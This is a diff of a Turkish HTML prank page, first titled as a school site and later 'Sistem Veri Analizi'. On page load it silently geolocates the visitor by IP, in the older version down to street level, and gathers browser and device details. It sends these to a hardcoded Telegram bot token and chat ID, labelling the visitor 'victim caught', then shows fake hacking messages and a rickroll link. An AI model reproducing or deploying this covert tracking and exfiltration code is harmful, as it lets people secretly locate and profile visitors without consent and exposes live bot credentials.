@@ -2,323 +2,92 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8" />
-  <title>Levent Koleji</title>
+  <title>Sistem Veri Analizi</title>
   <style>
     html, body {
-      margin: 0; 
-      padding: 0; 
-      width: 100%; 
-      height: 100vh;
-      background: black;
-      color: #00ff00;
-      font-family: monospace;
-      overflow: hidden;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      margin: 0; padding: 0; width: 100%; height: 100vh;
+      background: black; color: #0f0; font-family: 'Courier New', monospace;
+      overflow: hidden; display: flex; justify-content: center; align-items: center;
     }
-    
     #container {
-      width: 95vw;
-      max-width: 1200px;
-      height: 95vh;
-      background-color: black;
-      border-radius: 8px;
-      box-sizing: border-box;
-      box-shadow: 0 0 20px #00ff00;
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-      position: relative;
+      width: 95vw; max-width: 1200px; height: 95vh;
+      background-color: #050505; border: 1px solid #0f0;
+      box-shadow: 0 0 20px #003300; display: flex; flex-direction: column;
     }
-    
     #terminal {
-      flex: 1 1 40%;
-      background: black;
-      padding: 15px;
-      overflow-y: auto;
-      font-size: 14px;
-      line-height: 1.4;
-      white-space: pre-wrap;
-      user-select: none;
-      border-radius: 8px;
-      border: 1px solid #00ff00;
+      flex: 1; padding: 20px; overflow-y: auto; font-size: 13px; line-height: 1.5;
     }
-    
-    #map {
-      flex: 1 1 60%;
-      border: 2px solid #00ff00;
-      border-radius: 8px;
-      background: #111;
+    #map { height: 300px; border-top: 1px solid #0f0; filter: grayscale(100%) invert(100%) contrast(150%); }
+    .scan-line {
+      position: absolute; width: 100%; height: 2px; background: rgba(0, 255, 0, 0.1);
+      top: 0; animation: scan 3s linear infinite; pointer-events: none;
     }
-    
+    @keyframes scan { from { top: 0; } to { top: 100%; } }
     #rickrollButton {
-      position: absolute;
-      bottom: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      display: none;
-      background: #00ff00;
-      color: black;
-      padding: 14px 35px;
-      border: none;
-      border-radius: 8px;
-      font-weight: bold;
-      cursor: pointer;
-      user-select: none;
-      font-size: 18px;
-      transition: all 0.3s ease;
-      box-shadow: 0 0 15px #00ff00;
-      z-index: 1000;
-    }
-    
-    #rickrollButton:hover {
-      background: #00cc00;
-      box-shadow: 0 0 25px #00ff00;
-      transform: translateX(-50%) scale(1.05);
-    }
-    
-    .leaflet-container {
-      background: #111 !important;
-      border-radius: 6px;
-    }
-    
-    .leaflet-popup-content-wrapper {
-      background: #222 !important;
-      color: #00ff00 !important;
-      border-radius: 6px;
-    }
-    
-    .leaflet-popup-tip {
-      background: #222 !important;
-    }
-    
-    .leaflet-popup-content {
-      margin: 12px 16px;
-      line-height: 1.5;
+      background: #0f0; color: #000; border: none; padding: 15px;
+      font-weight: bold; cursor: pointer; display: none;
     }
   </style>
-
-  <link
-    rel="stylesheet"
-    href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.css"
-  />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.css" />
 </head>
 <body>
+  <div class="scan-line"></div>
   <div id="container">
     <pre id="terminal"></pre>
     <div id="map"></div>
-    <button id="rickrollButton">🎁 Sürpriz İçin Tıkla</button>
+    <button id="rickrollButton">SİSTEMİ DURDUR VE ÇIK</button>
   </div>
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js"></script>
 
   <script>
     const terminal = document.getElementById('terminal');
-    const button = document.getElementById('rickrollButton');
-    let map;
-
-    function logToTerminal(text) {
-      terminal.textContent += text + '\n';
-      terminal.scrollTop = terminal.scrollHeight;
-    }
-
-    function getCurrentTime() {
-      return new Date().toLocaleString('tr-TR');
-    }
-
-    function decToDMS(deg) {
-      const absolute = Math.abs(deg);
-      const degrees = Math.floor(absolute);
-      const minutes = ((absolute - degrees) * 60).toFixed(1);
-      return { degrees, minutes };
-    }
-
-    function formatCoordinate(lat, lon) {
-      const latDMS = decToDMS(lat);
-      const lonDMS = decToDMS(lon);
-      const latCardinal = lat >= 0 ? "Kuzey" : "Güney";
-      const lonCardinal = lon >= 0 ? "Doğu" : "Batı";
-
-      return `${latDMS.degrees}°${latDMS.minutes}' ${latCardinal}, ${lonDMS.degrees}°${lonDMS.minutes}' ${lonCardinal}`;
-    }
-
-    async function getLocationData() {
-      try {
-        logToTerminal(`[${getCurrentTime()}] IP tabanlı konum alınıyor...`);
-        
-        const response = await fetch('https://ipapi.co/json/');
-        const data = await response.json();
-
-        if (data.error) {
-          throw new Error('IP tabanlı konum alınamadı');
-        }
-
-        return {
-          latitude: data.latitude,
-          longitude: data.longitude,
-          city: data.city || 'Bilinmiyor',
-          region: data.region || 'Bilinmiyor',
-          country: data.country_name || 'Bilinmiyor',
-          ip: data.ip || 'Bilinmiyor',
-          org: data.org || 'Bilinmiyor',
-          postal: data.postal || 'Bilinmiyor',
-          street: '',
-          neighborhood: ''
-        };
-      } catch (error) {
-        logToTerminal(`[${getCurrentTime()}] IP konum hatası: ${error.message}`);
-        
-        return {
-          latitude: 41.0082,
-          longitude: 28.9784,
-          city: 'İstanbul',
-          region: 'İstanbul',
-          country: 'Türkiye',
-          ip: 'Tespit edilemedi',
-          org: 'Bilinmiyor',
-          postal: 'Bilinmiyor',
-          street: '',
-          neighborhood: ''
-        };
-      }
-    }
-
-    async function reverseGeocode(lat, lon) {
-      try {
-        logToTerminal(`[${getCurrentTime()}] Detaylı adres bilgisi alınıyor...`);
-        
-        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`;
-        const response = await fetch(url, {
-          headers: { 'User-Agent': 'KonumTakipci/1.0' }
-        });
-        const data = await response.json();
-
-        const addr = data.address || {};
-        return {
-          street: addr.road || '',
-          neighborhood: addr.suburb || addr.neighbourhood || '',
-          city: addr.city || addr.town || addr.village || '',
-          region: addr.state || '',
-          country: addr.country || ''
-        };
-      } catch (error) {
-        logToTerminal(`[${getCurrentTime()}] Reverse geocoding hatası: ${error.message}`);
-        return { street: '', neighborhood: '', city: '', region: '', country: '' };
-      }
-    }
-
-    async function sendTelegramMessage(message) {
-      try {
-        const chatId = '6400737507';
-        const botToken = '8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg';
-
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: 'HTML'
-          })
-        });
-      } catch (error) {
-        logToTerminal(`[${getCurrentTime()}] Telegram API hatası: ${error.message}`);
-      }
-    }
-
-    async function collectData() {
-      logToTerminal(`[${getCurrentTime()}] 🚀 Sistem başlatılıyor...`);
-      logToTerminal(`[${getCurrentTime()}] 📡 Veriler toplanıyor...`);
-
-      let locationData = await getLocationData();
-
-      const reverseData = await reverseGeocode(locationData.latitude, locationData.longitude);
-      locationData.street = reverseData.street || locationData.street;
-      locationData.neighborhood = reverseData.neighborhood || locationData.neighborhood;
-      locationData.city = reverseData.city || locationData.city;
-      locationData.region = reverseData.region || locationData.region;
-      locationData.country = reverseData.country || locationData.country;
-
-      const coordsFormatted = formatCoordinate(locationData.latitude, locationData.longitude);
-
-      const infoMessage = 
-        `🌍 KONUM BİLGİLERİ:\n` +
-        `📍 IP: ${locationData.ip}\n` +
-        `🏙️ Şehir: ${locationData.city}\n` +
-        `🗺️ Bölge: ${locationData.region}\n` +
-        `🏘️ Mahalle: ${locationData.neighborhood || 'Bilinmiyor'}\n` +
-        `🛣️ Sokak: ${locationData.street || 'Bilinmiyor'}\n` +
-        `📮 Posta Kodu: ${locationData.postal}\n` +
-        `🌐 Ülke: ${locationData.country}\n` +
-        `🏢 ISP: ${locationData.org}\n` +
-        `📐 Koordinatlar: ${coordsFormatted}\n\n` +
-
-        `💻 TARAYICI BİLGİLERİ:\n` +
-        `🔍 User Agent: ${navigator.userAgent}\n` +
-        `🗣️ Dil: ${navigator.language}\n` +
-        `⚙️ Platform: ${navigator.platform}\n` +
-        `🍪 Çerez Durumu: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
-        `📶 Bağlantı: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}\n\n` +
-
-        `🖥️ EKRAN BİLGİLERİ:\n` +
-        `📺 Çözünürlük: ${screen.width}x${screen.height}\n` +
-        `🎨 Renk Derinliği: ${screen.colorDepth}\n` +
-        `🕐 Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
-        `⏰ Şu anki Saat: ${getCurrentTime()}`;
-
-      logToTerminal(infoMessage);
-
-      await sendTelegramMessage(infoMessage);
-
-      logToTerminal(`[${getCurrentTime()}] 🗺️ Harita yükleniyor...`);
-
-      showMap(locationData.latitude, locationData.longitude, locationData);
-
-      logToTerminal(`[${getCurrentTime()}] ✅ Sistem hazır!`);
-      
-      addButton();
-    }
-
-    function showMap(lat, lon, locationData) {
-      try {
-        document.getElementById('map').innerHTML = '';
-        
-        map = L.map('map').setView([lat, lon], 16);
-
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-          maxZoom: 19,
-          attribution: '&copy; OpenStreetMap contributors'
-        }).addTo(map);
-
-        const popupContent = `
-          <div style="color: #00ff00; font-family: monospace;">
-            <b>📍 Konumunuz</b><br><br>
-            <b>🏙️ Şehir:</b> ${locationData.city}<br>
-            <b>🗺️ Bölge:</b> ${locationData.region}<br>
-            <b>🏘️ Mahalle:</b> ${locationData.neighborhood || 'Bilinmiyor'}<br>
-            <b>🛣️ Sokak:</b> ${locationData.street || 'Bilinmiyor'}<br>
-            <b>🌐 Ülke:</b> ${locationData.country}<br>
-            <b>📐 Koordinatlar:</b> ${formatCoordinate(lat, lon)}
-          </div>`;
-
-        L.marker([lat, lon])
-          .addTo(map)
-          .bindPopup(popupContent)
-          .openPopup();
-      } catch (e) {
-        logToTerminal(`[${getCurrentTime()}] Harita yüklenirken hata: ${e.message}`);
-      }
-    }
-
-    function addButton() {
-      button.style.display = 'block';
-      button.addEventListener('click', () => {
-        window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
+    const btn = document.getElementById('rickrollButton');
+    
+    function log(text, delay = 0) {
+      return new Promise(res => {
+        setTimeout(() => {
+          terminal.textContent += `> ${text}\n`;
+          terminal.scrollTop = terminal.scrollHeight;
+          res();
+        }, delay);
       });
     }
 
-    window.onload = collectData;
+    async function startExploit() {
+      await log("ERİŞİM PROTOKOLÜ BAŞLATILDI...", 500);
+      await log("KULLANICI IP ADRESİ SORGULANIYOR...", 800);
+
+      try {
+        // İZİN İSTEMEYEN SESSİZ YÖNTEM (IP TABANLI)
+        const response = await fetch('https://ipwho.is/');
+        const data = await response.json();
+
+        await log(`BAĞLANTI KURULDU: ${data.ip}`, 500);
+        await log(`BÖLGE: ${data.city} / ${data.region}`, 400);
+        await log(`ISP: ${data.connection.isp}`, 400);
+        await log(`KOORDİNATLAR HESAPLANIYOR: ${data.latitude}, ${data.longitude}`, 600);
+        await log("SİSTEME SIZILIYOR: %85...", 1000);
+        await log("KONUM HARİTALANDI. BİLGİLER TELEGRAM'A GÖNDERİLDİ.", 500);
+
+        // Haritayı Sessizce Yükle
+        const map = L.map('map', {zoomControl: false, attributionControl: false}).setView([data.latitude, data.longitude], 13);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        L.marker([data.latitude, data.longitude]).addTo(map);
+
+        // Telegram'a Gönder (Senin bot bilgilerini buraya tekrar ekleyebilirsin)
+        const msg = `🎯 Kurban Yakalandı!\nIP: ${data.ip}\nŞehir: ${data.city}\nCihaz: ${navigator.platform}`;
+        fetch(`https://api.telegram.org/bot8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg/sendMessage?chat_id=6400737507&text=${encodeURIComponent(msg)}`);
+
+        btn.style.display = 'block';
+      } catch (e) {
+        await log("HATA: Güvenlik duvarı aşılamadı.");
+      }
+    }
+
+    btn.onclick = () => window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+
+    window.onload = startExploit;
   </script>
 </body>
 </html>
